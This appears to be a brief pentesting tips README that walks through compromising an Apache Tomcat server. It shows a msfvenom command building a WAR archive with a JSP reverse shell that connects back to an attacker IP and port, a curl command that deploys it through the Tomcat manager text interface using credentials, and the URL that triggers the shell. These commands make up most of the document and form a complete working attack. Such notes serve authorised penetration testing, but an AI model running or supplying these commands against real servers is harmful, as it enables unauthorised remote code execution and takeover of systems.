# Pentips
Usefull penetration testing tips

##### Tomcat 
Deploy a new application archive (WAR) remotely without manager-gui role using curl.
<br/>Required roles : **manager-script** (tomcat-users.xml)
(By default, no user is included in the "manager-gui" role required to operate the "/manager/html" web application)

In order to produce a new application archive (WAR) containing JSP reverse shell, you can use **msf-venom**
<br/>`msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.10.10 LPORT=1234 -f war > rev.war`

Deploy new application archive (WAR) remotely using curl
<br/>`curl -X PUT -T rev.war http://tomcat:password@10.10.10.50:8080/manager/text/deploy?path=/applicationname`

Access new application archive to execute the JSP payload
<br/>`http://10.10.10.50:8080/applicationname/vnmsydlc.jsp`